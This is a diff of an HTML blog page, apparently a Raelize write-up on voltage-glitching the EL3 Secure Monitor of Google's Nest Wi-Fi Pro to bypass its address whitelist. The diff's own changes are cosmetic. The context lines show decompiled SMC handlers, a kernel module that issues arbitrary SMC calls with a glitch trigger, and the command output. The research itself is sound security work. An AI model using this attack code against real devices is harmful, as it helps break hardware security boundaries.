@@ -69,7 +69,7 @@
 	<!-- RSS feed discovery -->
 	
 
-	<meta name="generator" content="Hugo 0.164.0">
+	<meta name="generator" content="Hugo 0.145.0">
 
 	<!-- plugins -->
 	
@@ -218,7 +218,7 @@
 <h2 id="attack-identification">Attack identification</h2>
 <hr>
 <p>The Secure Monitor (EL3) implements several SMC commands, including <code>io_access_read</code> (<code>0x2000501</code>) and <code>io_access_write</code> (<code>0x2000502</code>). These can be used by the REE (i.e., Android) to read and write several hardware registers to control various hardware functionality (e.g., watchdog). The decompiled code for these SMC commands is shown below, as is visible, both call another function that implements the functionality (i.e., <code>el3_smc_read_from</code> and <code>el3_smc_write_to</code>).</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>...
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>...
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (smcid <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x2000501</span> )
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    v23 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">el3_smc_read_from</span>(smc_regs<span style="color:#ff79c6">-&gt;</span>x2);
@@ -235,7 +235,7 @@
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>...
 </span></span></code></pre></div><p>The decompiled code for <code>el3_smc_read_from</code> is shown below. The function argument is passed from the REE using the <a href="https://developer.arm.com/documentation/den0028/latest/">SMC</a> interface. The implementation is fairly straightforward. It simply dereferences<a href="https://en.wiktionary.org/wiki/dereference">*</a> from the <code>address</code> argument directly to a local variable, which is then passed back to the REE. This is possible as EL3 uses a flat mapping to access memory, where virtual addresses are equal to physical addresses.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">el3_smc_read_from</span>(<span style="color:#8be9fd">uint32_t</span> <span style="color:#ff79c6">*</span>address) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">el3_smc_read_from</span>(<span style="color:#8be9fd">uint32_t</span> <span style="color:#ff79c6">*</span>address) {
 </span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">uint32_t</span> value;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( <span style="color:#50fa7b">is_allowed_address</span>(address) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span> ) {
@@ -248,7 +248,7 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> value;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>The decompiled code for <code>el3_smc_write_to</code> is shown below. In very similar fashion as <code>el3_smc_read_from</code>, it simply dereferences an arbitrary value to an arbitrary address using the function arguments, which are passed from the REE.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">el3_smc_write_to</span>(<span style="color:#8be9fd">uint32_t</span> <span style="color:#ff79c6">*</span>address, <span style="color:#8be9fd">uint32_t</span> value)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">el3_smc_write_to</span>(<span style="color:#8be9fd">uint32_t</span> <span style="color:#ff79c6">*</span>address, <span style="color:#8be9fd">uint32_t</span> value)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( <span style="color:#50fa7b">is_allowed_address</span>(a1) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span> ) {
 </span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">barrier</span>(qword_4AC0E280);
@@ -259,11 +259,11 @@
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>The values passed by the REE should, of course, be checked. Otherwise, the REE could, read from any address and write any value to any address, that is accessible to the Secure Monitor (EL3). Therefore, both commands use the function <code>is_allowed_address()</code> to determine if the read or write is performed on an allowed address. A whitelist is used to define which addresses are allowed. Hence, if a read or write is performed on an address that is not on the whitelist, the operation will be discarded.</p>
 <p>The decompiled code for <code>is_allowed_address()</code> is shown below. The address <code>&amp;allowed_addresses</code> points to the whitelist containing the addresses that are allowed. The code loops over all the entries searching for a match to the address argument.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">is_allowed_address</span>(<span style="color:#8be9fd">int</span> a1)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">is_allowed_address</span>(<span style="color:#8be9fd">int</span> a1)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> v1; <span style="color:#6272a4">// w8
-</span></span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> <span style="color:#ff79c6">*</span>i; <span style="color:#6272a4">// x9
-</span></span></span><span style="display:flex;"><span>
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> <span style="color:#ff79c6">*</span>i; <span style="color:#6272a4">// x9
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
 </span></span><span style="display:flex;"><span>  v1 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
 </span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>allowed_addresses; <span style="color:#ff79c6">*</span>i <span style="color:#ff79c6">!=</span> a1; <span style="color:#ff79c6">++</span>i )
 </span></span><span style="display:flex;"><span>  {
@@ -273,7 +273,7 @@
 </span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1LL</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>The whitelist used by <code>is_allowed_address()</code> is shown below. The addresses in this whitelist map to various hardware registers (e.g., watchdog). As the technical reference manual of Qualcomm&rsquo;s IPQ5018 SoC is not publicly available, we do not know what these addresses exactly map to. However, we expect hints can be found in Linux kernel sources on github, and of course in the binary code of both the REE and TEE.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>LOAD:000000004AC084D0 allowed_addresses DCD 0x193D100
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>LOAD:000000004AC084D0 allowed_addresses DCD 0x193D100
 </span></span><span style="display:flex;"><span>LOAD:000000004AC084D4                   DCD 0xB1880B0
 </span></span><span style="display:flex;"><span>LOAD:000000004AC084D8                   DCD 0xB1880B8
 </span></span><span style="display:flex;"><span>LOAD:000000004AC084DC                   DCD 0xB1980B0
@@ -285,12 +285,12 @@
 <h2 id="attack-code">Attack code</h2>
 <hr>
 <p>As you may know, the <code>smc</code> instruction can only only be executed from the REE by <code>NS-EL1</code> (kernel) and <code>NS-EL2</code> (hypervisor), not by <code>NS-EL0</code> (user). Hence, we decided to create a custom kernel module that is able to execute an <code>smc</code> instruction with arbitrary arguments.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;linux/module.h&gt;</span><span style="color:#ff79c6">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;linux/module.h&gt;</span><span style="color:#ff79c6">
 </span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;linux/kernel.h&gt;</span><span style="color:#ff79c6">
 </span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;linux/types.h&gt;</span><span style="color:#ff79c6">
 </span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;linux/dma-mapping.h&gt;</span><span style="color:#ff79c6">
 </span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;asm/cacheflush.h&gt;</span><span style="color:#ff79c6">
-</span></span></span><span style="display:flex;"><span>
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
 </span></span><span style="display:flex;"><span><span style="color:#50fa7b">MODULE_LICENSE</span>(<span style="color:#f1fa8c">&#34;GPL&#34;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#50fa7b">MODULE_AUTHOR</span>(<span style="color:#f1fa8c">&#34;Raelize&#34;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#50fa7b">MODULE_DESCRIPTION</span>(<span style="color:#f1fa8c">&#34;SEND SMC for Google&#39;s Nest Wi-Fi Pro (3.73.406133)&#34;</span>);
@@ -333,10 +333,10 @@
 </span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">__asmeq</span>(<span style="color:#f1fa8c">&#34;%7&#34;</span>, <span style="color:#f1fa8c">&#34;r6&#34;</span>)
 </span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">__asmeq</span>(<span style="color:#f1fa8c">&#34;%8&#34;</span>, <span style="color:#f1fa8c">&#34;r8&#34;</span>)
 </span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r9, #3;str r9, [r8];&#34;</span> <span style="color:#6272a4">// trigger on
-</span></span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;.arch_extension sec</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#f1fa8c">&#34;.arch_extension sec</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>
 </span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;smc    #0      @ switch to secure world</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r9, #0;str r9, [r8];&#34;</span> <span style="color:#6272a4">// trigger off
-</span></span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;=r&#34;</span> (r0)
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;=r&#34;</span> (r0)
 </span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;r&#34;</span> (r0), <span style="color:#f1fa8c">&#34;r&#34;</span> (r1), <span style="color:#f1fa8c">&#34;r&#34;</span> (r2), <span style="color:#f1fa8c">&#34;r&#34;</span> (r3), <span style="color:#f1fa8c">&#34;r&#34;</span> (r4), <span style="color:#f1fa8c">&#34;r&#34;</span> (r5), <span style="color:#f1fa8c">&#34;r&#34;</span> (r6), <span style="color:#f1fa8c">&#34;r&#34;</span> (r8)
 </span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;r9&#34;</span>, <span style="color:#f1fa8c">&#34;r12&#34;</span>
 </span></span><span style="display:flex;"><span>    );
@@ -365,22 +365,22 @@
 </span></span><span style="display:flex;"><span><span style="color:#50fa7b">module_init</span>(smc_init);
 </span></span><span style="display:flex;"><span><span style="color:#50fa7b">module_exit</span>(smc_exit);
 </span></span></code></pre></div><p>When we use the <code>io_access_read</code> command to read from an allowed address (i.e., it&rsquo;s in the whitelist) we read that value contained in the register at the specified address. Below we show how we read <code>0x00000017</code> from <code>0x193d100</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>/ # insmod send_t.ko _smcid=0x2000501 _para1=0x193D100 &amp;&amp; rmmod send_t.ko
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>/ # insmod send_t.ko _smcid=0x2000501 _para1=0x193D100 &amp;&amp; rmmod send_t.ko
 </span></span><span style="display:flex;"><span>[ 7535.721834] smc (init)!
 </span></span><span style="display:flex;"><span>[ 7535.721876] 00000000 00000017 0193d100 00000000 00000000 00000000
 </span></span><span style="display:flex;"><span>[ 7535.739018] smc (exit)!
 </span></span></code></pre></div><p>When we use the <code>io_access_read</code> command to read from an address that&rsquo;s not allowed (i.e., it&rsquo;s not in the whitelist), we get <code>0x00000000</code> as the response. Below we try to read from the start of the TEXT section of the Secure Monitor (i.e., <code>0x4ac00000</code>) which is of course not allowed.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>/ # insmod send_t.ko _smcid=0x2000501 _para1=0x4ac00000 &amp;&amp; rmmod send_t.ko
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>/ # insmod send_t.ko _smcid=0x2000501 _para1=0x4ac00000 &amp;&amp; rmmod send_t.ko
 </span></span><span style="display:flex;"><span>[ 5535.722834] smc (init)!
 </span></span><span style="display:flex;"><span>[ 5535.722876] 00000000 00000000 4ac00000 00000000 00000000 00000000
 </span></span><span style="display:flex;"><span>[ 5535.740018] smc (exit)!
 </span></span></code></pre></div><p>When we use the <code>io_access_write</code> command to write to an allowed address, the provided value is simply written at the address location. In the example below we write <code>0x41414141</code> to <code>0x193d100</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>/ # insmod send_t.ko _smcid=0x2000502 _para1=0x193D100 _para2=0x41414141 &amp;&amp; rmmod send_t.ko
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>/ # insmod send_t.ko _smcid=0x2000502 _para1=0x193D100 _para2=0x41414141 &amp;&amp; rmmod send_t.ko
 </span></span><span style="display:flex;"><span>[  333.658447] smc (init)!
 </span></span><span style="display:flex;"><span>[  333.658467] 00000000 00000000 0193d100 41414141 00000000 00000000
 </span></span><span style="display:flex;"><span>[  333.663441] smc (exit)!
 </span></span></code></pre></div><p>When we use the <code>io_access_write</code> command to write to an address that&rsquo;s not allowed, the write is masked (i.e., not performed).</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>/ # insmod send_t.ko _smcid=0x2000502 _para1=0x4ac00000 _para2=0x41414141 &amp;&amp; rmmod send_t.ko
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>/ # insmod send_t.ko _smcid=0x2000502 _para1=0x4ac00000 _para2=0x41414141 &amp;&amp; rmmod send_t.ko
 </span></span><span style="display:flex;"><span>[  123.648446] smc (init)!
 </span></span><span style="display:flex;"><span>[  123.648466] 00000000 00000000 4ac00000 41414141 00000000 00000000
 </span></span><span style="display:flex;"><span>[  123.653431] smc (exit)!
@@ -389,14 +389,14 @@
 <h2 id="attack-timing">Attack timing</h2>
 <hr>
 <p>To time the attack, we use the same <code>GPIO</code> signal as during the characterization (i.e., factory reset button). We set it high just before issuing the <code>smc</code> instruction and low after it&rsquo;s finished (i.e., it returns from EL3). This allows us to reliably time our glitches.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>...
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>...
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">asm</span> <span style="color:#ff79c6">volatile</span>(
 </span></span><span style="display:flex;"><span>    ...
 </span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;mov r9, #3;str r9, [r8];&#34;</span> <span style="color:#6272a4">// trigger on
-</span></span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;.arch_extension sec</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#f1fa8c">&#34;.arch_extension sec</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;smc    #0      @ switch to secure world</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;mov r9, #0;str r9, [r8];&#34;</span> <span style="color:#6272a4">// trigger off
-</span></span></span><span style="display:flex;"><span>    ...
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    ...
 </span></span><span style="display:flex;"><span>);
 </span></span><span style="display:flex;"><span>...
 </span></span></code></pre></div><p>We define the attack window, in which our target code construction is executed, by measuring the trigger up and down moments using an oscilloscope. It&rsquo;s guaranteed to be executed within this window as the trigger goes up before the <code>smc</code> instruction and down after it returns. We randomize the timing within this window as we do not exactly know when the check we are targeting is being performed.</p>
@@ -415,7 +415,7 @@
 <hr>
 <p>We tried first to bypass the <code>is_allowed_address()</code> check for <code>io_access_read</code> as this would be easier to confirm. When we are successful, the value stored at a non-allowed address is simply returned. We decided to target address <code>0x4ac00000</code> as this address is the first instruction of the Secure Monitor (EL3). It&rsquo;s fair to assume this address can be read by the Secure Monitor (EL3) as it can be executed. Note, this may not always hold up, e.g., when EXecute Only Memory (XOM)<a href="https://source.android.com/docs/security/test/execute-only-memory">*</a> is used. However, as code is mixed with data, we are confident it&rsquo;s not used for the Secure Monitor (EL3).</p>
 <p>On the other hand, the address <code>0x4ac00000</code> should certainly not be readable from the REE, as it belongs to secure memory. Still, we can obtain the value stored at its location (shown below) via reverse engineering of the Secure Monitor (EL3).</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>entry:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>entry:
 </span></span><span style="display:flex;"><span>    4ac00000    e1 ff 9f d2     mov x1, #0xffff
 </span></span><span style="display:flex;"><span>    4ac00004    21 bc 70 d3     lsl x1, x1, #0x10
 </span></span><span style="display:flex;"><span>    4ac00008    21 3c 40 b2     orr x1, x1, #0xffff
@@ -440,7 +440,7 @@
 <p>We assumed that the Secure Monitor (EL3) cannot overwrite its own code due to the MMU configuration. Hence, we decided not to use <code>0x4ac00000</code> as the address to write to, as we assumed this would simply fail. We settled for an address we deemed accessible from the Secure Monitor (EL3) as well as from REE (e.g., a hardware register). This allows us to verify if we are successful from REE just by using the <code>devmem</code> command. This commands is able to map physical memory in Linux user space using the <code>/dev/mem</code> file.</p>
 <p>After a bit of probing the hardware registers of Qualcomm&rsquo;s IPQ5018 SoC, along with reversing the Secure Monitor (EL3), we decided to use the address <code>0x1814000</code>. We don&rsquo;t know exactly what this hardware register is used for, but we were confident this could be accessed by the Secure Monitor (EL3).</p>
 <p>We confirmed the REE can access it using <code>devmem</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>/ # devmem 0x1814000 32 0x41414141
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>/ # devmem 0x1814000 32 0x41414141
 </span></span><span style="display:flex;"><span>/ # devmem 0x1814000 32
 </span></span><span style="display:flex;"><span>0x01414141
 </span></span><span style="display:flex;"><span>/ #
@@ -529,7 +529,7 @@
 
 <!-- Main Script -->
 
-<script src="https://raelize.com/js/script.min.30c5d71cc6d4427af95614c557ab5b3e327ad2aa865d9c4cb3e3af601bd051948abde36c96cad1b4cb71909318d0e18c.js" integrity="sha384-MMXXHMbUQnr5VhTFV6tbPjJ60qqGXZxMs&#43;OvYBvQUZSKveNslsrRtMtxkJMY0OGM"></script>
+<script src="https://raelize.com/js/script.min.117f25fdd69809937e03f47113cbf673f49c2074d65da15ea1d385ad742d92a49ed5dd2000a4585ecfdebda6feb7ef54.js" integrity="sha384-EX8l/daYCZN&#43;A/RxE8v2c/ScIHTWXaFeodOFrXQtkqSe1d0gAKRYXs/evab&#43;t&#43;9U"></script>
 
 
 </body>
